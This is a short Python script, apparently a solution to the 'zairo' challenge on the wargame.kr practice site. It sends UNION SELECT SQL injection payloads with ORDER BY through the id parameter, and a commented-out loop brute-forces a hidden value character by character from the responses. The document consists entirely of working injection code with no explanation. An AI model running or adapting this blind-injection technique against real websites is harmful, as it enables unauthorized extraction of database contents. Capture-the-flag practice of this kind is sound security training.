from requests import *
url=f'http://wargame.kr:8080/zairo?pw=&flag=abs&id=zairowkdlfhdkel%27 union select 1,2,3,%27%57%0f%27,5 order by 4 asc %23'
response=get(url=url)
print(url)
print(response.text)
'''
tmp='!"#$%&)*+,-./0123456789:;<>?@abcdefghijklmnopqrstuvwxynz[\]^_`{|}~'
for i in range(len(tmp)):
    url=f'http://wargame.kr:8080/zairo?pw=&flag=abs&id=zairowkdlfhdkel\' union select 1,2,3,\'{tmp[i]}\',5 order by 4 asc %23'
    response=get(url=url)
    #print(url)
    #print(response.text)
    if response.text.find('2') == -1 and response.text.find('zairowkdlfhdkel') == -1:
        print(tmp[i])
'''